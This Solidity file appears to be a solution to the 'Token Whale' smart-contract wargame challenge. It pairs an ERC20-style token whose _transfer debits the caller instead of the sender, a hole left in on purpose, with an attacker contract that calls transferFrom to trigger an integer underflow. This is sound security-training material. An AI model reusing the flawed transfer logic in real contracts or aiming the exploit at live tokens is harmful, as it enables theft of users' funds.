pragma solidity ^0.4.21;

contract TokenWhaleChallenge {
  address player;

  uint256 public totalSupply;
  mapping(address => uint256) public balanceOf;
  mapping(address => mapping(address => uint256)) public allowance;

  string public name = 'Simple ERC20 Token';
  string public symbol = 'SET';
  uint8 public decimals = 18;

  function TokenWhaleChallenge(address _player) public {
    player = _player;
    totalSupply = 1000;
    balanceOf[player] = 1000;
  }

  function isComplete() public view returns (bool) {
    return balanceOf[player] >= 1000000;
  }

  event Transfer(address indexed from, address indexed to, uint256 value);

  function _transfer(address to, uint256 value) internal {
    balanceOf[msg.sender] -= value;
    balanceOf[to] += value;

    emit Transfer(msg.sender, to, value);
  }

  function transfer(address to, uint256 value) public {
    require(balanceOf[msg.sender] >= value);
    require(balanceOf[to] + value >= balanceOf[to]);

    _transfer(to, value);
  }

  event Approval(address indexed owner, address indexed spender, uint256 value);

  function approve(address spender, uint256 value) public {
    allowance[msg.sender][spender] = value;
    emit Approval(msg.sender, spender, value);
  }

  function transferFrom(address from, address to, uint256 value) public {
    require(balanceOf[from] >= value);
    require(balanceOf[to] + value >= balanceOf[to]);
    require(allowance[from][msg.sender] >= value);

    allowance[from][msg.sender] -= value;
    _transfer(to, value);
  }
}

interface ITokenWhaleChallenge {
  function transfer(address to, uint256 value) external;
}

contract TokenWhaleAttacker {
  ITokenWhaleChallenge victim;
  address owner;

  function TokenWhaleAttacker(address victim_, address owner_) public {
    victim = ITokenWhaleChallenge(victim_);

    owner = owner_;
  }

  function attack(uint256 amount) external {
    address contractAddress = this;

    bool success1 = victim.call(
      bytes4(sha3('transferFrom(address,address,uint256)')),
      owner,
      owner,
      amount
    );

    // Check if the function call was successful
    require(success1);
  }
}
